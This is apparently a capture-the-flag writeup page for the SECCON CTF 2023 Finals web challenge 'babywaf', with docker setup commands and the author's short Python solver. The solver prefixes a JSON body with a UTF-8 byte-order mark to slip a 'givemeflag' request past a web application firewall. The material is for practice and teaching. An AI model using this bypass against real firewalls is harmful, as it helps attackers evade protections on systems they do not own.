---
title: "Babywaf - SECCON CTF 2023 Finals"
category: "web"
type: "writeup"
tags: ["arkark-my-ctf-challenges", "author-solution", "challenge-source", "babywaf", "web", "seccon-ctf-2023-finals"]
summary: "Launch a challenge server:"
source:
  name: "arkark/my-ctf-challenges"
  url: "https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202312_SECCON_CTF_2023_Finals/web/babywaf"
license: "none stated"
ctf:
  name: "SECCON CTF 2023 Finals"
  year: 2023
  challenge: "Babywaf"
---

## Challenge

- **Author:** [arkark](https://github.com/arkark)
- **Source:** <https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202312_SECCON_CTF_2023_Finals/web/babywaf>
- **CTF:** SECCON CTF 2023 Finals

---

# [web] babywaf

## Description

Do you want a flag? 🚩🚩🚩

- Challenge: `http://babywaf.{int,dom}.seccon.games:3000`

## Attachments

- [babywaf](files/babywaf)

## Usage

Launch a challenge server:

```
cd build
docker compose up
```

Run the author's solver:
```
docker run -it --rm \
    -e WEB_BASE_URL=http://localhost:3000 \
    --network=host \
    (docker build -q ./solver)
```


## Solver: `exploit.py`

<https://github.com/arkark/my-ctf-challenges/blob/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202312_SECCON_CTF_2023_Finals/web/babywaf/solver/exploit.py>

```python
import httpx
import os

BASE_URL = os.environ["WEB_BASE_URL"]

res = httpx.post(
    BASE_URL,
    headers={"Content-Type": "text/plain"},
    content='\ufeff{"givemeflag": true}',  # UTF-8 BOM
)
print(res.text)
```
